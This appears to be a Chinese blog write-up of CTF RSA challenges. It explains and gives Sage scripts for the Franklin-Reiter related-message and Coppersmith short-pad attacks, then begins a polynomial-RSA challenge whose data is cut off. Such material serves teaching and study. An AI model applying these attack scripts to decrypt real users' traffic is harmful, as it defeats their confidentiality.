<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#23772599983135215481563178266884362291876571759991288577057472733374903836591330410574958472090396886895304944176208711481780781286891334062794555288959410390926474473859289842654809538435377431088422352076225067494924657598298955407771484146155998883073439266427190212827600119365643065276814044272790573450938596830336430371987561905132579730619341196199420897034988685012777895002554746080384319298123154671447844799088258541911028041717897434816921424155687677867019535399434825468160227242441375503664915265223696139025407768146464383537556265875013085702422829200814612395116961538432886116917063119749068212699</span></span><br><span class="line"><span class="comment">#10900151504654409767059699202929100225155892269473271859207513720755903691031362539478242920144073599515746938827937863835169270383721094542639011665235593065932998091574636525973099426040452626893461449084383663453549354608769727777329036059746386523843912382289597182615339786437186169811342356085836838520978047561127661777189045888648773949147220411427306098338616422692914110656004863767719312410906124366000507952960331116878197129010412361636679449281808407214524741732730279777729251515759320442591663641984363061618865267606007355576230009922421807527598213455112981354590909603317525854070358390622096569841</span></span><br><span class="line"><span class="comment">#17298679220717326374674940612143058330715465693318467692839033642321129433471254547497087746971317567301086124779289015934582615377165560688447452762043163082394944604062014490446763247008217251611443338103074143809936437694543761369945095202092750900940979469994907399829695696313513303922266742415376818434932335640062684245008822643258497589196668426788916969378417960200705779461808292296450298558001909603602502604228973101048082095642290047196235959438278631661658312398313171590515776453711432353011579809351076532129444735206408591345372296372378396539831385036814349328459266432393612919118094115543053115450</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>今年过年的时候做的，当时也写了WP。主要分两步吧，先求出x和y</p>
<p>当时有师傅在我博客下面评论，说x和y不一定是只有两个元素，问我为什么这样还可以做；当时我也只给了个肌无力的回答</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210708115429140.png" alt="image-20210708115429140"></p>
<p>现在，我已不再是曾经那个菜鸡，而是弱鸡</p>
<p>我们再来分析一下，assert就是条件。首先lambda匿名函数里的x和y并非题目里的x和y，参数罢了；其次这个列表中的元素是True和False，对于secret中的x，只有所有的元素都满足(i-5)*i+6==0这个等式，列表中的所有元素才都是Ture，也只有这样用reduce不断迭代套用x&amp;y最后的返回值才会是True，整个assert才不会报错。y同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br></pre></td></tr></table></figure>

<p>所以x和y里面可以有多个元素，不止两个，但比如x，里面就能出现2或者3，管你是[2,3,3,3]，还是[2,3,3,3,2,3,3,3]。</p>
<p>至于下面一个多项式，正如那位师傅说的那样，理论上确实，没有证据这不是一个关于m的多项式，而且系数只有2或3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br></pre></td></tr></table></figure>

<p>总之之前的解法，DDDD，没有比我更懂CTF签到~，就当x=[2,3]，y=[4,11]了，别的情况也没有更多的条件可以明确指明</p>
<p>所以我们得到了<br>$$<br>\begin{align}<br>c=(2m+3)^{17}\ mod\ n\\<br>c=(4m+11)^{17}\ mod\ n<br>\end{align}<br>$$<br>相当于换一下变量<br>$$<br>c=x^{17}\ mod\ n<br>$$<br>$$<br>c=(2x+5)^{17}\ mod\ n<br>$$<br>我们可以很明显地看到了其中蕴含的线性关系</p>
<blockquote>
<p>Coppersmith’s Short-pad Attack &amp; Related Message Attack（Franklin-Reiter攻击）</p>
</blockquote>
<p>从la佬的博客中据悉，所谓的padding过短，就是对应多项式的根会过小；提供了两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">c1, c2, n, e</span>):</span></span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    g1 = (a*x+b)^e - c1</span><br><span class="line">    g2 = (c*x+d)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 =</span><br><span class="line">c2 =</span><br><span class="line">n =</span><br><span class="line">e =</span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n =</span><br><span class="line">    e =</span><br><span class="line">    c1 =</span><br><span class="line">    c2 =</span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m2:&quot;</span>, m1 + diff)</span><br></pre></td></tr></table></figure>

<p>这道题我们魔改脚本1就能出来，不贴了，之前贴过</p>
<h2 id="unusualrsa3"><a href="#unusualrsa3" class="headerlink" title="unusualrsa3"></a>unusualrsa3</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line">p:</span><br><span class="line"><span class="number">2470567871</span></span><br><span class="line"></span><br><span class="line">N:</span><br><span class="line"><span class="number">1932231392</span>*x^<span class="number">255</span> + <span class="number">1432733708</span>*x^<span class="number">254</span> + <span class="number">1270867914</span>*x^<span class="number">253</span> + <span class="number">1573324635</span>*x^<span class="number">252</span> + <span class="number">2378103997</span>*x^<span class="number">251</span> + <span class="number">820889786</span>*x^<span class="number">250</span> + <span class="number">762279735</span>*x^<span class="number">249</span> + <span class="number">1378353578</span>*x^<span class="number">248</span> + <span class="number">1226179520</span>*x^<span class="number">247</span> + <span class="number">657116276</span>*x^<span class="number">246</span> + <span class="number">1264717357</span>*x^<span class="number">245</span> + <span class="number">1015587392</span>*x^<span class="number">244</span> + <span class="number">849699356</span>*x^<span class="number">243</span> + <span class="number">1509168990</span>*x^<span class="number">242</span> + <span class="number">2407367106</span>*x^<span class="number">241</span> + <span class="number">873379233</span>*x^<span class="number">240</span> + <span class="number">2391647981</span>*x^<span class="number">239</span> + <span class="number">517715639</span>*x^<span class="number">238</span> + <span class="number">828941376</span>*x^<span class="number">237</span> + <span class="number">843708018</span>*x^<span class="number">236</span> + <span class="number">1526075137</span>*x^<span class="number">235</span> + <span class="number">1499291590</span>*x^<span class="number">234</span> + <span class="number">235611028</span>*x^<span class="number">233</span> + <span class="number">19615265</span>*x^<span class="number">232</span> + <span class="number">53338886</span>*x^<span class="number">231</span> + <span class="number">434434839</span>*x^<span class="number">230</span> + <span class="number">902171938</span>*x^<span class="number">229</span> + <span class="number">516444143</span>*x^<span class="number">228</span> + <span class="number">1984443642</span>*x^<span class="number">227</span> + <span class="number">966493372</span>*x^<span class="number">226</span> + <span class="number">1166227650</span>*x^<span class="number">225</span> + <span class="number">1824442929</span>*x^<span class="number">224</span> + <span class="number">930231465</span>*x^<span class="number">223</span> + <span class="number">1664522302</span>*x^<span class="number">222</span> + <span class="number">1067203343</span>*x^<span class="number">221</span> + <span class="number">28569139</span>*x^<span class="number">220</span> + <span class="number">2327926559</span>*x^<span class="number">219</span> + <span class="number">899788156</span>*x^<span class="number">218</span> + <span class="number">296985783</span>*x^<span class="number">217</span> + <span class="number">1144578716</span>*x^<span class="number">216</span> + <span class="number">340677494</span>*x^<span class="number">215</span> + <span class="number">254306901</span>*x^<span class="number">214</span> + <span class="number">766641243</span>*x^<span class="number">213</span> + <span class="number">1882320336</span>*x^<span class="number">212</span> + <span class="number">2139903463</span>*x^<span class="number">211</span> + <span class="number">1904225023</span>*x^<span class="number">210</span> + <span class="number">475412928</span>*x^<span class="number">209</span> + <span class="number">127723603</span>*x^<span class="number">208</span> + <span class="number">2015416361</span>*x^<span class="number">207</span> + <span class="number">1500078813</span>*x^<span class="number">206</span> + <span class="number">1845826007</span>*x^<span class="number">205</span> + <span class="number">797486240</span>*x^<span class="number">204</span> + <span class="number">85924125</span>*x^<span class="number">203</span> + <span class="number">1921772796</span>*x^<span class="number">202</span> + <span class="number">1322682658</span>*x^<span class="number">201</span> + <span class="number">2372929383</span>*x^<span class="number">200</span> + <span class="number">1323964787</span>*x^<span class="number">199</span> + <span class="number">1302258424</span>*x^<span class="number">198</span> + <span class="number">271875267</span>*x^<span class="number">197</span> + <span class="number">1297768962</span>*x^<span class="number">196</span> + <span class="number">2147341770</span>*x^<span class="number">195</span> + <span class="number">1665066191</span>*x^<span class="number">194</span> + <span class="number">2342921569</span>*x^<span class="number">193</span> + <span class="number">1450622685</span>*x^<span class="number">192</span> + <span class="number">1453466049</span>*x^<span class="number">191</span> + <span class="number">1105227173</span>*x^<span class="number">190</span> + <span class="number">2357717379</span>*x^<span class="number">189</span> + <span class="number">1044263540</span>*x^<span class="number">188</span> + <span class="number">697816284</span>*x^<span class="number">187</span> + <span class="number">647124526</span>*x^<span class="number">186</span> + <span class="number">1414769298</span>*x^<span class="number">185</span> + <span class="number">657373752</span>*x^<span class="number">184</span> + <span class="number">91863906</span>*x^<span class="number">183</span> + <span class="number">1095083181</span>*x^<span class="number">182</span> + <span class="number">658171402</span>*x^<span class="number">181</span> + <span class="number">75339882</span>*x^<span class="number">180</span> + <span class="number">2216678027</span>*x^<span class="number">179</span> + <span class="number">2208320155</span>*x^<span class="number">178</span> + <span class="number">1351845267</span>*x^<span class="number">177</span> + <span class="number">1740451894</span>*x^<span class="number">176</span> + <span class="number">1302531891</span>*x^<span class="number">175</span> + <span class="number">320751753</span>*x^<span class="number">174</span> + <span class="number">1303477598</span>*x^<span class="number">173</span> + <span class="number">783321123</span>*x^<span class="number">172</span> + <span class="number">1400145206</span>*x^<span class="number">171</span> + <span class="number">1379768234</span>*x^<span class="number">170</span> + <span class="number">1191445903</span>*x^<span class="number">169</span> + <span class="number">946530449</span>*x^<span class="number">168</span> + <span class="number">2008674144</span>*x^<span class="number">167</span> + <span class="number">2247371104</span>*x^<span class="number">166</span> + <span class="number">1267042416</span>*x^<span class="number">165</span> + <span class="number">1795774455</span>*x^<span class="number">164</span> + <span class="number">1976911493</span>*x^<span class="number">163</span> + <span class="number">167037165</span>*x^<span class="number">162</span> + <span class="number">1848717750</span>*x^<span class="number">161</span> + <span class="number">573072954</span>*x^<span class="number">160</span> + <span class="number">1126046031</span>*x^<span class="number">159</span> + <span class="number">376257986</span>*x^<span class="number">158</span> + <span class="number">1001726783</span>*x^<span class="number">157</span> + <span class="number">2250967824</span>*x^<span class="number">156</span> + <span class="number">2339380314</span>*x^<span class="number">155</span> + <span class="number">571922874</span>*x^<span class="number">154</span> + <span class="number">961000788</span>*x^<span class="number">153</span> + <span class="number">306686020</span>*x^<span class="number">152</span> + <span class="number">80717392</span>*x^<span class="number">151</span> + <span class="number">2454799241</span>*x^<span class="number">150</span> + <span class="number">1005427673</span>*x^<span class="number">149</span> + <span class="number">1032257735</span>*x^<span class="number">148</span> + <span class="number">593980163</span>*x^<span class="number">147</span> + <span class="number">1656568780</span>*x^<span class="number">146</span> + <span class="number">1865541316</span>*x^<span class="number">145</span> + <span class="number">2003844061</span>*x^<span class="number">144</span> + <span class="number">1265566902</span>*x^<span class="number">143</span> + <span class="number">573548790</span>*x^<span class="number">142</span> + <span class="number">494063408</span>*x^<span class="number">141</span> + <span class="number">1722266624</span>*x^<span class="number">140</span> + <span class="number">938551278</span>*x^<span class="number">139</span> + <span class="number">2284832499</span>*x^<span class="number">138</span> + <span class="number">597191613</span>*x^<span class="number">137</span> + <span class="number">476121126</span>*x^<span class="number">136</span> + <span class="number">1237943942</span>*x^<span class="number">135</span> + <span class="number">275861976</span>*x^<span class="number">134</span> + <span class="number">1603993606</span>*x^<span class="number">133</span> + <span class="number">1895285286</span>*x^<span class="number">132</span> + <span class="number">589034062</span>*x^<span class="number">131</span> + <span class="number">713986937</span>*x^<span class="number">130</span> + <span class="number">1206118526</span>*x^<span class="number">129</span> + <span class="number">311679750</span>*x^<span class="number">128</span> + <span class="number">1989860861</span>*x^<span class="number">127</span> + <span class="number">1551409650</span>*x^<span class="number">126</span> + <span class="number">2188452501</span>*x^<span class="number">125</span> + <span class="number">1175930901</span>*x^<span class="number">124</span> + <span class="number">1991529213</span>*x^<span class="number">123</span> + <span class="number">2019090583</span>*x^<span class="number">122</span> + <span class="number">215965300</span>*x^<span class="number">121</span> + <span class="number">532432639</span>*x^<span class="number">120</span> + <span class="number">1148806816</span>*x^<span class="number">119</span> + <span class="number">493362403</span>*x^<span class="number">118</span> + <span class="number">2166920790</span>*x^<span class="number">117</span> + <span class="number">185609624</span>*x^<span class="number">116</span> + <span class="number">184370704</span>*x^<span class="number">115</span> + <span class="number">2141702861</span>*x^<span class="number">114</span> + <span class="number">223551915</span>*x^<span class="number">113</span> + <span class="number">298497455</span>*x^<span class="number">112</span> + <span class="number">722376028</span>*x^<span class="number">111</span> + <span class="number">678813029</span>*x^<span class="number">110</span> + <span class="number">915121681</span>*x^<span class="number">109</span> + <span class="number">1107871854</span>*x^<span class="number">108</span> + <span class="number">1369194845</span>*x^<span class="number">107</span> + <span class="number">328165402</span>*x^<span class="number">106</span> + <span class="number">1792110161</span>*x^<span class="number">105</span> + <span class="number">798151427</span>*x^<span class="number">104</span> + <span class="number">954952187</span>*x^<span class="number">103</span> + <span class="number">471555401</span>*x^<span class="number">102</span> + <span class="number">68969853</span>*x^<span class="number">101</span> + <span class="number">453598910</span>*x^<span class="number">100</span> + <span class="number">2458706380</span>*x^<span class="number">99</span> + <span class="number">889221741</span>*x^<span class="number">98</span> + <span class="number">320515821</span>*x^<span class="number">97</span> + <span class="number">1549538476</span>*x^<span class="number">96</span> + <span class="number">909607400</span>*x^<span class="number">95</span> + <span class="number">499973742</span>*x^<span class="number">94</span> + <span class="number">552728308</span>*x^<span class="number">93</span> + <span class="number">1538610725</span>*x^<span class="number">92</span> + <span class="number">186272117</span>*x^<span class="number">91</span> + <span class="number">862153635</span>*x^<span class="number">90</span> + <span class="number">981463824</span>*x^<span class="number">89</span> + <span class="number">2400233482</span>*x^<span class="number">88</span> + <span class="number">1742475067</span>*x^<span class="number">87</span> + <span class="number">437801940</span>*x^<span class="number">86</span> + <span class="number">1504315277</span>*x^<span class="number">85</span> + <span class="number">1756497351</span>*x^<span class="number">84</span> + <span class="number">197089583</span>*x^<span class="number">83</span> + <span class="number">2082285292</span>*x^<span class="number">82</span> + <span class="number">109369793</span>*x^<span class="number">81</span> + <span class="number">2197572728</span>*x^<span class="number">80</span> + <span class="number">107235697</span>*x^<span class="number">79</span> + <span class="number">567322310</span>*x^<span class="number">78</span> + <span class="number">1755205142</span>*x^<span class="number">77</span> + <span class="number">1089091449</span>*x^<span class="number">76</span> + <span class="number">1993836978</span>*x^<span class="number">75</span> + <span class="number">2393709429</span>*x^<span class="number">74</span> + <span class="number">170647828</span>*x^<span class="number">73</span> + <span class="number">1205814501</span>*x^<span class="number">72</span> + <span class="number">2444570340</span>*x^<span class="number">71</span> + <span class="number">328372190</span>*x^<span class="number">70</span> + <span class="number">1929704306</span>*x^<span class="number">69</span> + <span class="number">717796715</span>*x^<span class="number">68</span> + <span class="number">1057597610</span>*x^<span class="number">67</span> + <span class="number">482243092</span>*x^<span class="number">66</span> + <span class="number">277530014</span>*x^<span class="number">65</span> + <span class="number">2393168828</span>*x^<span class="number">64</span> + <span class="number">12380707</span>*x^<span class="number">63</span> + <span class="number">1108646500</span>*x^<span class="number">62</span> + <span class="number">637721571</span>*x^<span class="number">61</span> + <span class="number">604983755</span>*x^<span class="number">60</span> + <span class="number">1142068056</span>*x^<span class="number">59</span> + <span class="number">1911643955</span>*x^<span class="number">58</span> + <span class="number">1713852330</span>*x^<span class="number">57</span> + <span class="number">1757273231</span>*x^<span class="number">56</span> + <span class="number">1778819295</span>*x^<span class="number">55</span> + <span class="number">957146826</span>*x^<span class="number">54</span> + <span class="number">900005615</span>*x^<span class="number">53</span> + <span class="number">521467961</span>*x^<span class="number">52</span> + <span class="number">1255707235</span>*x^<span class="number">51</span> + <span class="number">861871574</span>*x^<span class="number">50</span> + <span class="number">397953653</span>*x^<span class="number">49</span> + <span class="number">1259753202</span>*x^<span class="number">48</span> + <span class="number">471431762</span>*x^<span class="number">47</span> + <span class="number">1245956917</span>*x^<span class="number">46</span> + <span class="number">1688297180</span>*x^<span class="number">45</span> + <span class="number">1536178591</span>*x^<span class="number">44</span> + <span class="number">1833258462</span>*x^<span class="number">43</span> + <span class="number">1369087493</span>*x^<span class="number">42</span> + <span class="number">459426544</span>*x^<span class="number">41</span> + <span class="number">418389643</span>*x^<span class="number">40</span> + <span class="number">1800239647</span>*x^<span class="number">39</span> + <span class="number">2467433889</span>*x^<span class="number">38</span> + <span class="number">477713059</span>*x^<span class="number">37</span> + <span class="number">1898813986</span>*x^<span class="number">36</span> + <span class="number">2202042708</span>*x^<span class="number">35</span> + <span class="number">894088738</span>*x^<span class="number">34</span> + <span class="number">1204601190</span>*x^<span class="number">33</span> + <span class="number">1592921228</span>*x^<span class="number">32</span> + <span class="number">2234027582</span>*x^<span class="number">31</span> + <span class="number">1308900201</span>*x^<span class="number">30</span> + <span class="number">461430959</span>*x^<span class="number">29</span> + <span class="number">718926726</span>*x^<span class="number">28</span> + <span class="number">2081988029</span>*x^<span class="number">27</span> + <span class="number">1337342428</span>*x^<span class="number">26</span> + <span class="number">2039153142</span>*x^<span class="number">25</span> + <span class="number">1364177470</span>*x^<span class="number">24</span> + <span class="number">613659517</span>*x^<span class="number">23</span> + <span class="number">853968854</span>*x^<span class="number">22</span> + <span class="number">1013582418</span>*x^<span class="number">21</span> + <span class="number">1167857934</span>*x^<span class="number">20</span> + <span class="number">2014147362</span>*x^<span class="number">19</span> + <span class="number">1083466865</span>*x^<span class="number">18</span> + <span class="number">1091690302</span>*x^<span class="number">17</span> + <span class="number">302196939</span>*x^<span class="number">16</span> + <span class="number">1946675573</span>*x^<span class="number">15</span> + <span class="number">2450124113</span>*x^<span class="number">14</span> + <span class="number">1199066291</span>*x^<span class="number">13</span> + <span class="number">401889502</span>*x^<span class="number">12</span> + <span class="number">712045611</span>*x^<span class="number">11</span> + <span class="number">1850096904</span>*x^<span class="number">10</span> + <span class="number">1808400208</span>*x^<span class="number">9</span> + <span class="number">1567687877</span>*x^<span class="number">8</span> + <span class="number">2013445952</span>*x^<span class="number">7</span> + <span class="number">2435360770</span>*x^<span class="number">6</span> + <span class="number">2414019676</span>*x^<span class="number">5</span> + <span class="number">2277377050</span>*x^<span class="number">4</span> + <span class="number">2148341337</span>*x^<span class="number">3</span> + <span class="number">1073721716</span>*x^<span class="number">2</span> + <span class="number">1045363399</span>*x + <span class="number">1809685811</span></span><br><span class="line"></span><br><span class="line">m^<span class="number">0x10001</span>%N:  </span><br><span class="line"><span class="number">922927962</span>*x^<span class="number">254</span> + <span class="number">1141958714</span>*x^<span class="number">253</span> + <span class="number">295409606</span>*x^<span class="number">252</span> + <span class="number">1197491798</span>*x^<span class="number">251</span> + <span class="number">2463440866</span>*x^<span class="number">250</span> + <span class="number">1671460946</span>*x^<span class="number">249</span> + <span class="number">967543123</span>*x^<span class="number">248</span> + <span class="number">119796323</span>*x^<span class="number">247</span> + <span class="number">1172760592</span>*x^<span class="number">246</span> + <span class="number">770640267</span>*x^<span class="number">245</span> + <span class="number">1093816376</span>*x^<span class="number">244</span> + <span class="number">196379610</span>*x^<span class="number">243</span> + <span class="number">2205270506</span>*x^<span class="number">242</span> + <span class="number">459693142</span>*x^<span class="number">241</span> + <span class="number">829093322</span>*x^<span class="number">240</span> + <span class="number">816440689</span>*x^<span class="number">239</span> + <span class="number">648546871</span>*x^<span class="number">238</span> + <span class="number">1533372161</span>*x^<span class="number">237</span> + <span class="number">1349964227</span>*x^<span class="number">236</span> + <span class="number">2132166634</span>*x^<span class="number">235</span> + <span class="number">403690250</span>*x^<span class="number">234</span> + <span class="number">835793319</span>*x^<span class="number">233</span> + <span class="number">2056945807</span>*x^<span class="number">232</span> + <span class="number">480459588</span>*x^<span class="number">231</span> + <span class="number">1401028924</span>*x^<span class="number">230</span> + <span class="number">2231055325</span>*x^<span class="number">229</span> + <span class="number">1716893325</span>*x^<span class="number">228</span> + <span class="number">16299164</span>*x^<span class="number">227</span> + <span class="number">1125072063</span>*x^<span class="number">226</span> + <span class="number">1903340994</span>*x^<span class="number">225</span> + <span class="number">1372971897</span>*x^<span class="number">224</span> + <span class="number">242927971</span>*x^<span class="number">223</span> + <span class="number">711296789</span>*x^<span class="number">222</span> + <span class="number">535407256</span>*x^<span class="number">221</span> + <span class="number">976773179</span>*x^<span class="number">220</span> + <span class="number">533569974</span>*x^<span class="number">219</span> + <span class="number">501041034</span>*x^<span class="number">218</span> + <span class="number">326232105</span>*x^<span class="number">217</span> + <span class="number">2248775507</span>*x^<span class="number">216</span> + <span class="number">1010397596</span>*x^<span class="number">215</span> + <span class="number">1641864795</span>*x^<span class="number">214</span> + <span class="number">1365178317</span>*x^<span class="number">213</span> + <span class="number">1038477612</span>*x^<span class="number">212</span> + <span class="number">2201213637</span>*x^<span class="number">211</span> + <span class="number">760847531</span>*x^<span class="number">210</span> + <span class="number">2072085932</span>*x^<span class="number">209</span> + <span class="number">168159257</span>*x^<span class="number">208</span> + <span class="number">70202009</span>*x^<span class="number">207</span> + <span class="number">1193933930</span>*x^<span class="number">206</span> + <span class="number">1559162272</span>*x^<span class="number">205</span> + <span class="number">1380642174</span>*x^<span class="number">204</span> + <span class="number">1296625644</span>*x^<span class="number">203</span> + <span class="number">1338288152</span>*x^<span class="number">202</span> + <span class="number">843839510</span>*x^<span class="number">201</span> + <span class="number">460174838</span>*x^<span class="number">200</span> + <span class="number">660412151</span>*x^<span class="number">199</span> + <span class="number">716865491</span>*x^<span class="number">198</span> + <span class="number">772161222</span>*x^<span class="number">197</span> + <span class="number">924177515</span>*x^<span class="number">196</span> + <span class="number">1372790342</span>*x^<span class="number">195</span> + <span class="number">320044037</span>*x^<span class="number">194</span> + <span class="number">117027412</span>*x^<span class="number">193</span> + <span class="number">814803809</span>*x^<span class="number">192</span> + <span class="number">1175035545</span>*x^<span class="number">191</span> + <span class="number">244769161</span>*x^<span class="number">190</span> + <span class="number">2116927976</span>*x^<span class="number">189</span> + <span class="number">617780431</span>*x^<span class="number">188</span> + <span class="number">342577832</span>*x^<span class="number">187</span> + <span class="number">356586691</span>*x^<span class="number">186</span> + <span class="number">695795444</span>*x^<span class="number">185</span> + <span class="number">281750528</span>*x^<span class="number">184</span> + <span class="number">133432552</span>*x^<span class="number">183</span> + <span class="number">741747447</span>*x^<span class="number">182</span> + <span class="number">2138036298</span>*x^<span class="number">181</span> + <span class="number">524386605</span>*x^<span class="number">180</span> + <span class="number">1231287380</span>*x^<span class="number">179</span> + <span class="number">1246706891</span>*x^<span class="number">178</span> + <span class="number">69277523</span>*x^<span class="number">177</span> + <span class="number">2124927225</span>*x^<span class="number">176</span> + <span class="number">2334697345</span>*x^<span class="number">175</span> + <span class="number">1769733543</span>*x^<span class="number">174</span> + <span class="number">2248037872</span>*x^<span class="number">173</span> + <span class="number">1899902290</span>*x^<span class="number">172</span> + <span class="number">409421149</span>*x^<span class="number">171</span> + <span class="number">1223261878</span>*x^<span class="number">170</span> + <span class="number">666594221</span>*x^<span class="number">169</span> + <span class="number">1795456341</span>*x^<span class="number">168</span> + <span class="number">406003299</span>*x^<span class="number">167</span> + <span class="number">992699270</span>*x^<span class="number">166</span> + <span class="number">2201384104</span>*x^<span class="number">165</span> + <span class="number">907692883</span>*x^<span class="number">164</span> + <span class="number">1667882231</span>*x^<span class="number">163</span> + <span class="number">1414341647</span>*x^<span class="number">162</span> + <span class="number">1592159752</span>*x^<span class="number">161</span> + <span class="number">28054099</span>*x^<span class="number">160</span> + <span class="number">2184618098</span>*x^<span class="number">159</span> + <span class="number">2047102725</span>*x^<span class="number">158</span> + <span class="number">103202495</span>*x^<span class="number">157</span> + <span class="number">1803852525</span>*x^<span class="number">156</span> + <span class="number">446464179</span>*x^<span class="number">155</span> + <span class="number">909116906</span>*x^<span class="number">154</span> + <span class="number">1541693644</span>*x^<span class="number">153</span> + <span class="number">166545130</span>*x^<span class="number">152</span> + <span class="number">2283548843</span>*x^<span class="number">151</span> + <span class="number">2348768005</span>*x^<span class="number">150</span> + <span class="number">71682607</span>*x^<span class="number">149</span> + <span class="number">484339546</span>*x^<span class="number">148</span> + <span class="number">669511666</span>*x^<span class="number">147</span> + <span class="number">2110974006</span>*x^<span class="number">146</span> + <span class="number">1634563992</span>*x^<span class="number">145</span> + <span class="number">1810433926</span>*x^<span class="number">144</span> + <span class="number">2388805064</span>*x^<span class="number">143</span> + <span class="number">1200258695</span>*x^<span class="number">142</span> + <span class="number">1555191384</span>*x^<span class="number">141</span> + <span class="number">363842947</span>*x^<span class="number">140</span> + 